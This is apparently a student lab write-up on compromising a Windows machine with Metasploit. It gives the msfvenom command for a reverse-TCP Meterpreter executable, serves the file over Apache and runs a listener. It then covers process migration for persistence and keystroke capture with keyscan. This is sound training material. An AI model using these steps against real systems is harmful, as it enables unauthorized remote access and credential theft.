### Date:
# Ex-6: Compromising-windows-using-Metasploit
Compromising windows using Metasploit
#### Metasploit
Compromising windows using Metasploit

## AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig
### OUTPUT:

![1)](https://github.com/user-attachments/assets/ca6c03c1-69bf-4509-bc99-59d9188f3fb3)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
### OUTPUT

![2)](https://github.com/user-attachments/assets/983bfb0e-ed12-4c64-a053-5cae4c4d2502)


copy the fun.exe into the apache /var/www/html folder

![3)](https://github.com/user-attachments/assets/94d253ce-5cd1-4fbc-a2c0-e73af02f901d)


Start apache server
sudo systemctl apache2 start

![4)](https://github.com/user-attachments/assets/81c96445-856e-458f-a89c-7cb867e4671e)

Check the status of apache2

![5)](https://github.com/user-attachments/assets/04fc89b9-b017-4f57-9abc-ab7c85966512)

Invoke msfconsole:
### OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

![6)](https://github.com/user-attachments/assets/f671f4bb-baec-4e82-abf9-9c4dc0ee9747)


set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![7)](https://github.com/user-attachments/assets/63f77a03-6743-4403-b00f-5234d648a5a9)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![exploit](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/b46a08f7-a9fc-4e71-8fdd-170ee187dd22)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![meterpreter-ps](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/7e6e28fb-b095-4fd1-81f8-a0292f82c9a2)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![migrate-Nexplorer](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/836e6efa-423f-4553-ad2f-19170b010892)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![notepad](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/35be18d7-51b0-4529-8fd8-76740f0c9ba6)
keyscan_dump	Shows the keystrokes captured so far
![keyscan_dump](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d40a4428-0c65-4855-be1d-c278766082fb)






## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
